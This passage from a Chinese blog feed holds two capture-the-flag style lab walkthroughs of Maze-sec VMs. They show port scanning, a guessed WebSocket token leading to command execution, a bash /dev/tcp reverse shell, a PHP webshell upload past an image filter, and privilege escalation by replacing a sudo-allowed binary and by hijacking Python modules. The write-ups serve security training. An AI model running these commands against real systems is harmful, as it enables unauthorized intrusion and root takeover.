<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-25 10:03 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.17<br>Host is up (0.00043s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>8765/tcp open  ultraseek-http<br>MAC Address: 08:00:27:9F:9E:3E (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 3.74 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22、80、87665</code></p><h3 id="2-详细信息扫描"><a href="#2-详细信息扫描" class="headerlink" title="2.详细信息扫描"></a>2.详细信息扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec/maze-sec]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80,8765,95 192.168.2.17<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-28 10:12 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.17<br>Host is up (0.00095s latency).<br><br>PORT     STATE  SERVICE         VERSION<br>22/tcp   open   ssh             OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp   open   http            Apache httpd 2.4.62 ((Debian))<br>|_http-server-header: Apache/2.4.62 (Debian)<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/html).</span><br><span class="hljs-string">95/tcp   closed supdup</span><br><span class="hljs-string">8765/tcp open   ultraseek-http?</span><br><span class="hljs-string">MAC Address: 08:00:27:9F:9E:3E (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string">Device type: general purpose</span><br><span class="hljs-string">Running: Linux 4.X|5.X</span><br><span class="hljs-string">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="hljs-string">OS details: Linux 4.15 - 5.8</span><br><span class="hljs-string">Network Distance: 1 hop</span><br><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="hljs-string"></span><br><span class="hljs-string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 89.88 seconds</span><br></code></pre></td></tr></table></figure><ol><li>22端口，ssh服务</li><li>80端口，http服务</li><li>8765端口，未知服务</li></ol><h1 id="二、服务枚举"><a href="#二、服务枚举" class="headerlink" title="二、服务枚举"></a>二、服务枚举</h1><h2 id="1、80端口-HTTP服务"><a href="#1、80端口-HTTP服务" class="headerlink" title="1、80端口-HTTP服务"></a>1、80端口-HTTP服务</h2><p>测试80端口的服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec/maze-sec]<br>└─# curl http://192.168.2.17        <br>index<br></code></pre></td></tr></table></figure><p>发现没有任何东西</p><h2 id="2、8765端口-未知服务"><a href="#2、8765端口-未知服务" class="headerlink" title="2、8765端口-未知服务"></a>2、8765端口-未知服务</h2><p>测试8765端口的服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec/maze-sec]<br>└─# curl http://192.168.2.17:8765<br>Failed to open a WebSocket connection: missing Connection header.<br><br>You cannot access a WebSocket server directly with a browser. You need a WebSocket client.<br></code></pre></td></tr></table></figure><p>发现是<code>websocket</code>服务</p><h2 id="3、WebSocket服务分析"><a href="#3、WebSocket服务分析" class="headerlink" title="3、WebSocket服务分析"></a>3、WebSocket服务分析</h2><p>WebSocket是一种在单个TCP连接上进行全双工通信的协议，常用于实时通信应用。错误信息提示需要使用WebSocket客户端连接。</p><p>Tip：<br>    <a href="https://book.hacktricks.wiki/en/pentesting-web/websocket-attacks.html?highlight=websoca#linux-console">https://book.hacktricks.wiki/en/pentesting-web/websocket-attacks.html?highlight=websoca#linux-console</a><br>    <a href="https://zh.wikipedia.org/wiki/WebSocket">https://zh.wikipedia.org/wiki/WebSocket</a></p><h1 id="三、WebSocket攻击"><a href="#三、WebSocket攻击" class="headerlink" title="三、WebSocket攻击"></a>三、WebSocket攻击</h1><h2 id="1、建立WebSocket连接"><a href="#1、建立WebSocket连接" class="headerlink" title="1、建立WebSocket连接"></a>1、建立WebSocket连接</h2><p>使用<code>websockets</code>工具连接到WebSocket服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec/maze-sec]<br>└─# websockets ws://192.168.2.17:8765<br>Connected to ws://192.168.2.17:8765.<br>&lt; &#123;<span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Connected to command server. Send commands use JSON&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>需要使用<code>JSON</code>格式进行发送</p><h2 id="2、JSON命令测试"><a href="#2、JSON命令测试" class="headerlink" title="2、JSON命令测试"></a>2、JSON命令测试</h2><p>尝试执行id</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt; &#123;<span class="hljs-string">&quot;command&quot;</span>: <span class="hljs-string">&quot;id&quot;</span>&#125;<br>&lt; &#123;<span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;error&quot;</span>, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Invalid token. Access denied.&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>提示需要<code>token</code></p><h2 id="3、Token绕过"><a href="#3、Token绕过" class="headerlink" title="3、Token绕过"></a>3、Token绕过</h2><p>尝试使用常见的token值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt; &#123;<span class="hljs-string">&quot;token&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;command&quot;</span>: <span class="hljs-string">&quot;id&quot;</span>&#125;<br>&lt; &#123;<span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;result&quot;</span>, <span class="hljs-string">&quot;command&quot;</span>: <span class="hljs-string">&quot;id&quot;</span>, <span class="hljs-string">&quot;output&quot;</span>: <span class="hljs-string">&quot;uid=1000(caidao) gid=1000(caidao) groups=1000(caidao)\n&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>成功执行<code>id</code>命令</p><h1 id="四、反向shell"><a href="#四、反向shell" class="headerlink" title="四、反向shell"></a>四、反向shell</h1><h2 id="1、获取初始shell"><a href="#1、获取初始shell" class="headerlink" title="1、获取初始shell"></a>1、获取初始shell</h2><p>通过WebSocket发送反向Shell命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt; &#123;<span class="hljs-string">&quot;token&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;command&quot;</span>: <span class="hljs-string">&quot;bash -c &#x27;/bin/bash -i &gt;&amp; /dev/tcp/192.168.2.4/4444 0&gt;&amp;1&#x27;&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>成功获取到shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nc -lvnp 4444<br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.17] 44994<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (390): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>caidao@Wushu:/root$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=1000(caidao) gid=1000(caidao) <span class="hljs-built_in">groups</span>=1000(caidao)<br></code></pre></td></tr></table></figure><h2 id="2、稳定shell"><a href="#2、稳定shell" class="headerlink" title="2、稳定shell"></a>2、稳定shell</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">script /dev/null -c bash<br><span class="hljs-comment"># Ctrl+Z</span><br><span class="hljs-built_in">stty</span> raw -<span class="hljs-built_in">echo</span>; <span class="hljs-built_in">fg</span><br>reset xterm<br><span class="hljs-built_in">export</span> TERM=xterm<br><span class="hljs-built_in">export</span> SHELL=/bin/bash<br><span class="hljs-built_in">stty</span> rows 36 columns 178<br></code></pre></td></tr></table></figure><h1 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h1><h2 id="1、查看sudo权限"><a href="#1、查看sudo权限" class="headerlink" title="1、查看sudo权限"></a>1、查看<code>sudo</code>权限</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">caidao@Wushu:~$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> caidao on Wushu:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User caidao may run the following commands on Wushu:<br>    (ALL : ALL) NOPASSWD: /usr/bin/2048<br></code></pre></td></tr></table></figure><p>发现可以无密码执行<code>/usr/bin/2048</code></p><h2 id="2、查找用户拥有的文件"><a href="#2、查找用户拥有的文件" class="headerlink" title="2、查找用户拥有的文件"></a>2、查找用户拥有的文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">caidao@Wushu:~$ find / -user $(<span class="hljs-built_in">whoami</span>) ! -path <span class="hljs-string">&#x27;/proc/*&#x27;</span> ! -path <span class="hljs-string">&#x27;/sys/*&#x27;</span> ! -path <span class="hljs-string">&#x27;/run/*&#x27;</span> 2&gt;/dev/null<br>/dev/pts/2<br>/dev/pts/1<br>/dev/pts/0<br>/usr<br></code></pre></td></tr></table></figure><p>发现<code>/usr</code>目录属于当前用户<code>caidao</code></p><p>验证<code>/usr</code>目录权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">caidao@Wushu:~$ <span class="hljs-built_in">ls</span> -la /usr<br>total 92<br>drwxr-xr-x  14 caidao caidao  4096 Aug 18 10:03 .<br>drwxr-xr-x  18 root   root    4096 Mar 18  2025 ..<br>drwxr-xr-x   2 root   root   28672 Aug 18 09:58 bin<br></code></pre></td></tr></table></figure><p>确认<code>/usr</code>目录的所有者是<code>caidao</code>用户，这是一个<strong>严重的权限配置错误</strong></p><h2 id="3、利用目录权限提权"><a href="#3、利用目录权限提权" class="headerlink" title="3、利用目录权限提权"></a>3、利用目录权限提权</h2><p>由于拥有<code>/usr</code>目录的写权限，可以替换<code>/usr/bin/2048</code>文件来获取root权限</p><ol><li>将<code>/usr/bin</code>目录重命名为<code>/usr/1</code>目录</li><li>创建恶意的2048程序</li><li>通过sudo执行获取root权限</li></ol><h3 id="1-备份和创建bin目录"><a href="#1-备份和创建bin目录" class="headerlink" title="1.备份和创建bin目录"></a>1.备份和创建bin目录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#备份原始bin目录</span><br>caidao@Wushu:~$ <span class="hljs-built_in">mv</span> /usr/bin /usr/1<br><br><span class="hljs-comment">#创建新的bin目录</span><br>caidao@Wushu:~$ /usr/1/mkdir /usr/bin<br></code></pre></td></tr></table></figure><h3 id="2-创建恶意2048程序"><a href="#2-创建恶意2048程序" class="headerlink" title="2.创建恶意2048程序"></a>2.创建恶意2048程序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">caidao@Wushu:/$ /usr/1/nano /usr/bin/2048<br>caidao@Wushu:/$ /usr/1/chmod +x /usr/bin/2048<br>caidao@Wushu:/$ /usr/1/cat /usr/bin/2048<br><span class="hljs-comment">#!/usr/1/bash</span><br>/usr/1/chmod +s /usr/1/bash<br></code></pre></td></tr></table></figure><h3 id="3-执行sudo命令触发setuid"><a href="#3-执行sudo命令触发setuid" class="headerlink" title="3.执行sudo命令触发setuid"></a>3.执行sudo命令触发setuid</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">caidao@Wushu:~$ /usr/1/sudo /usr/bin/2048<br></code></pre></td></tr></table></figure><h3 id="4-验证bash获得setuid权限"><a href="#4-验证bash获得setuid权限" class="headerlink" title="4.验证bash获得setuid权限"></a>4.验证bash获得setuid权限</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">caidao@Wushu:~$ /usr/1/ls -al /usr/1/bash<br>-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /usr/1/bash<br></code></pre></td></tr></table></figure><h3 id="5-使用-p参数保持特权"><a href="#5-使用-p参数保持特权" class="headerlink" title="5.使用-p参数保持特权"></a>5.使用-p参数保持特权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">caidao@Wushu:~$ /usr/1/bash -p<br></code></pre></td></tr></table></figure><h3 id="6-恢复系统"><a href="#6-恢复系统" class="headerlink" title="6.恢复系统"></a>6.恢复系统</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-5.0# /usr/1/rm -rf /usr/bin/<br>bash-5.0# /usr/1/mv /usr/1/ /usr/bin/<br></code></pre></td></tr></table></figure><h1 id="六、获取FLAG"><a href="#六、获取FLAG" class="headerlink" title="六、获取FLAG"></a>六、获取FLAG</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-5.0# <span class="hljs-built_in">cat</span> /root/root.txt /home/caidao/user.txt <br>flag&#123;root-bcb44f5672d98ad8a966ed474335716d&#125;<br>flag&#123;user-4141b1d21f4cbcfcfe214d474e9fb6b2&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Maze-sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WebSocket服务</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Walker</title>
    <link href="/Maze-sec/Walker/"/>
    <url>/Maze-sec/Walker/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><ul><li>QQ群：<code>660930334</code></li></ul><h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec]<br>└─# nmap -sn 192.168.2.0/24                          <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-18 16:29 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00075s latency).<br>MAC Address: 0A:00:27:00:00:07 (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00037s latency).<br>MAC Address: 08:00:27:2C:69:A0 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.15<br>Host is up (0.00052s latency).<br>MAC Address: 08:00:27:0E:B2:03 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.13 seconds<br></code></pre></td></tr></table></figure><p>靶机IP：<code>192.168.2.15</code></p><h2 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h2><h3 id="1-全端口扫描"><a href="#1-全端口扫描" class="headerlink" title="1.全端口扫描"></a>1.全端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec]<br>└─# nmap --min-rate 10000 -p- 192.168.2.15                             <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-18 16:29 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.15<br>Host is up (0.00018s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:0E:B2:03 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 5.66 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22、80</code></p><h3 id="2-详细信息扫描"><a href="#2-详细信息扫描" class="headerlink" title="2.详细信息扫描"></a>2.详细信息扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80 192.168.2.15 <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-18 16:30 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.15<br>Host is up (0.00062s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp open  http    Apache httpd 2.4.62 ((Debian))<br>|_http-title: CyberSec Professional - Bootstrap 5 Resume/CV Template<br>|_http-server-header: Apache/2.4.62 (Debian)<br>MAC Address: 08:00:27:0E:B2:03 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.98 seconds<br></code></pre></td></tr></table></figure><ol><li>22端口，ssh服务，用于远程登录</li><li>80端口，http服务</li></ol><h1 id="二、WEB渗透"><a href="#二、WEB渗透" class="headerlink" title="二、WEB渗透"></a>二、WEB渗透</h1><h2 id="1、路径信息泄露"><a href="#1、路径信息泄露" class="headerlink" title="1、路径信息泄露"></a>1、路径信息泄露</h2><p>访问80端口，发现是一份简历，同时<code>Web-Walk</code>字体与其他字体不一样，猜测可能是某个路径，尝试去访问<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202509251453597.png"></p><p>访问<code>Web-Walk</code>（Linux系统对大小写敏感，因此大小写都要进行尝试）<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202509251455796.png"><br>找到一个文件上传的功能</p><h2 id="2、文件上传利用"><a href="#2、文件上传利用" class="headerlink" title="2、文件上传利用"></a>2、文件上传利用</h2><p>经过测试，发现只允许上传<code>jpg, png, gif, webp</code>格式的图片，属于白名单检测<br>尝试修改文件头和文件MIME格式，发现成功上传，并泄露出文件上传后的路径<code>/var/www/html/web-walk/tmp/rev.php</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202509251502385.png"></p><h1 id="三、获取www-data权限"><a href="#三、获取www-data权限" class="headerlink" title="三、获取www-data权限"></a>三、获取www-data权限</h1><p>访问上传成功的文件<code>/web-talk/tmp/rev.php</code>，成功获取到shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec/maze-sec]<br>└─# nc -lvnp 4444     <br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.15] 33316<br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br></code></pre></td></tr></table></figure><p>获取稳定的shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">script /dev/null -c bash<br><span class="hljs-comment"># 按下 Ctrl+Z 将其挂起</span><br><span class="hljs-built_in">stty</span> raw -<span class="hljs-built_in">echo</span>; <span class="hljs-built_in">fg</span><br><span class="hljs-comment"># 按下回车</span><br>reset xterm<br><span class="hljs-built_in">export</span> TERM=xterm<br><span class="hljs-built_in">export</span> SHELL=/bin/bash<br><span class="hljs-built_in">stty</span> rows 24 columns 80<br></code></pre></td></tr></table></figure><h1 id="四、权限提升"><a href="#四、权限提升" class="headerlink" title="四、权限提升"></a>四、权限提升</h1><h2 id="1、获取walk权限"><a href="#1、获取walk权限" class="headerlink" title="1、获取walk权限"></a>1、获取walk权限</h2><p>在<code>web-walk/tmp/.config/binwalk/config/</code>目录下，找到一个<code>extract.conf</code>文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">onf data@walker:/var/www/html/web-walk/tmp/.config/binwalk/config$ <span class="hljs-built_in">cat</span> extract.conf<br>walk:walkwalkwalk<br></code></pre></td></tr></table></figure><p>找到一组凭证<code>walk:walkwalkwalk</code></p><p>切换到<code>walk</code>用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@walker:/home$ su walk<br>Password: <br>walk@walker:/home$ <span class="hljs-built_in">id</span><br>uid=1000(walk) gid=1000(walk) <span class="hljs-built_in">groups</span>=1000(walk)<br></code></pre></td></tr></table></figure><h2 id="2、获取root权限"><a href="#2、获取root权限" class="headerlink" title="2、获取root权限"></a>2、获取root权限</h2><p>查看<code>sudo</code>具有的权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">walk@walker:/home$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> walk on walker:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User walk may run the following commands on walker:<br>    (ALL) NOPASSWD: /usr/bin/python3 /home/walk/calc.py<br></code></pre></td></tr></table></figure><p>发现<code>/home/walk/calc.py</code>文件可以不需要密码即可使用<code>python3</code>进行执行<code>root</code>权限</p><p>执行<code>calc.py</code>，发现是一道算术题，需要执行<code>100次</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">walk@walker:~$ <span class="hljs-built_in">sudo</span> /usr/bin/python3 /home/walk/calc.py<br>Solve 100 math questions. Get 80 correct to reveal the password!<br><br>six + three = 9<br>Correct! Total correct: 1/100<br></code></pre></td></tr></table></figure><h3 id="os劫持"><a href="#os劫持" class="headerlink" title="os劫持"></a>os劫持</h3><p>写入恶意内容进行劫持</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">walk@walker:~$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;import os; os.system(&#x27;/bin/bash&#x27;)&quot;</span> &gt; random.py<br>walk@walker:~$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;import os; os.system(&#x27;/bin/bash&#x27;)&quot;</span> &gt; os.py<br></code></pre></td></tr></table></figure><p>注：<br>    将文件命名为 <code>os.py</code>是一种<strong>模块劫持（Module Hijacking）</strong> 尝试。当Python程序中 <code>import os</code>时，解释器会首先在当前目录下寻找名为 <code>os.py</code>的文件。如果找到，就会执行这个文件，而不是导入标准库中的 <code>os</code>模块。这意味着，如果一个正常的程序在包含此恶意 <code>os.py</code>的目录下运行，其导入操作会被劫持，从而无意中执行恶意代码。</p><p>获取root权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">walk@walker:~$ <span class="hljs-built_in">sudo</span> /usr/bin/python3 /home/walk/calc.py<br>root@walker:/home/walk# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure><h1 id="五、获取FLAG"><a href="#五、获取FLAG" class="headerlink" title="五、获取FLAG"></a>五、获取FLAG</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td 